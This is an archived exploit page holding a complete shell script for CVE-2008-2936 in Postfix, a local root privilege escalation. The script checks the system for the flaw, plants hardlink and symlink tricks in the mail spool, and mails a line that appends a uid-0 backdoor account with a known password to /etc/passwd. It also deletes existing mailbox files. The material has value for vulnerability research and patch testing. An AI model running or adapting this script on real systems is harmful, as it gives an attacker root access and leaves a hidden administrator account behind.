<html><head><title>Postfix <= 2.6-20080814 (symlink) Local Privilege Escalation Exploit</title></head><pre>#!/bin/sh
#
# &quot;rs_pocfix.sh&quot; (PoC for Postfix local root vulnerability: CVE-2008-2936)
# by Roman Medina-Heigl Hernandez a.k.a. RoMaNSoFt &lt;roman@rs-labs.com&gt;
#
# Tested: Ubuntu / Debian
#
# [ Madrid, 30.Aug.2008 ]
#

# Config

writable_dir=/tmp
spool_dir=/var/mail		# Use &quot;postconf mail_spool_directory&quot; to obtain this
user=root
target=/etc/passwd
useful_link=/usr/bin/atq	# lrwxrwxrwx 2 root root 2 2007-05-04 22:15 /usr/bin/atq -&gt; at
useful_link_dst=at		# Tip: find / -type l -uid 0 -print -exec ls -l {} \; | less
seconds=3
user_in_passwd=&quot;dsr:3GsXLdEaKaGnM:0:0:root:/root:/bin/sh&quot;   # Pass is &quot;dsrrocks&quot;
postfix=`which postfix`		# /usr/sbin/postfix
postconf=/usr/sbin/postconf
postmap=/usr/sbin/postmap


# Funcs

quit()
{
  echo &quot;$1&quot;
  exit
}


# Step 1: is my system vulnerable?

head -n 9 $0 | tail -n 8
if [ $postfix ] ; then
  echo &quot;[*] Postfix seems to be installed&quot;
else
  quit &quot;[!] Are you sure Postfix is installed?&quot;
fi

mkdir -p $writable_dir/pocfix
touch $writable_dir/pocfix/src
ln -s $writable_dir/pocfix/src $writable_dir/pocfix/dst1
ln $writable_dir/pocfix/dst1 $writable_dir/pocfix/dst2

if [ -L $writable_dir/pocfix/dst2 ] ; then
  echo &quot;[*] Hardlink to symlink not dereferenced&quot;
  rm -rf $writable_dir/pocfix
else
  rm -rf $writable_dir/pocfix
  quit &quot;[!] Hardlink to symlink correctly dereferenced. System is not vulnerable&quot;
fi

if [ -d $spool_dir -a -w $spool_dir ] ; then
  echo &quot;[*] Spool dir is writable&quot;
else
  quit &quot;[!] Spool dir is not writable&quot;
fi

if [ -e $spool_dir/$user ] ; then
  rm -f $spool_dir/$user
  echo &quot;[*] Mailbox for \&quot;$user\&quot; found. Trying to delete it&quot;

  if [ -e $spool_dir/$user ] ; then
    quit &quot;[!] Couldn't delete it&quot;
  else
    echo &quot;[*] Deletion ok&quot;
  fi

fi

if [ -e $spool_dir/$useful_link_dst ] ; then
  rm -f $spool_dir/$useful_link_dst
  echo &quot;[*] Mailbox for \&quot;$useful_link_dst\&quot; found. Trying to delete it&quot;

  if [ -e $spool_dir/$useful_link_dst ] ; then
    quit &quot;[!] Couldn't delete it&quot;
  else
    echo &quot;[*] Deletion ok&quot;
  fi

fi

aliases=`$postconf alias_database | cut -d&quot;=&quot; -f2`
$postconf alias_maps | grep -q $aliases
if [ $? -eq 0 ] ; then
  if [ $aliases ] ; then
    $postmap -q $user $aliases &gt; /dev/null
    if [ $? -eq 0 ] ; then
      quit &quot;[!] Mail alias for \&quot;$user\&quot; exists&quot;
    fi
  fi
fi

lda=`$postconf mailbox_command | cut -d&quot;=&quot; -f2`
if [ $lda ] ; then
  quit &quot;[!] Non-Postfix LDA detected&quot;
fi 

$postconf home_mailbox | grep -q '/$'
if [ $? -eq 0 ] ; then
  quit &quot;[!] Maildir-style mailbox detected&quot;
fi


# Step 2: Exploiting

ln -f $useful_link $spool_dir/$user 2&gt; /dev/null || quit &quot;[!] Couldn't create hardlink (different partitions?)&quot;
ln -s -f $target $spool_dir/$useful_link_dst 2&gt; /dev/null || quit &quot;[!] Couldn't create symlink pointing to target file&quot;
cp -f $target $writable_dir/pocfix_target_backup.$$ &amp;&amp; echo &quot;[*] Backed up: $target (saved as \&quot;$writable_dir/pocfix_target_backup.$$\&quot;)&quot;
echo &quot;[*] Sending mail ($seconds seconds wait)&quot;
echo $user_in_passwd | /usr/sbin/sendmail $user

sleep $seconds

diff -q $target $writable_dir/pocfix_target_backup.$$ &gt; /dev/null

if [ $? -eq 0 ] ; then
  echo &quot;[!] Exploit failed&quot;
else
  echo &quot;[*] Exploit successful (appended data to $target). Now \&quot;su dsr\&quot;, pass is \&quot;dsrrocks\&quot;)&quot;
fi

rm -f $spool_dir/$user
rm -f $spool_dir/$useful_link_dst

# milw0rm.com [2008-08-31]</pre></html>